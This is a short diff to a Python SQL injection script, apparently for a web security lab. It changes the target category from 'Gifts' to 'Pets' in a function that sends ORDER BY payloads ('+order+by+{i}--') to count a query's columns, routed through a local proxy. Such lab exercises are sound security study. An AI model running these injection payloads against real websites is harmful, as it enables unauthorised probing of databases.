@@ -8,7 +8,7 @@ proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 
 
 def exploit_sqli_column_num(url):
-    path = 'filter?category=Gifts'
+    path = 'filter?category=Pets'
     for i in range(1, 50):
         sql_payload = f"'+order+by+{i}--"
         r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
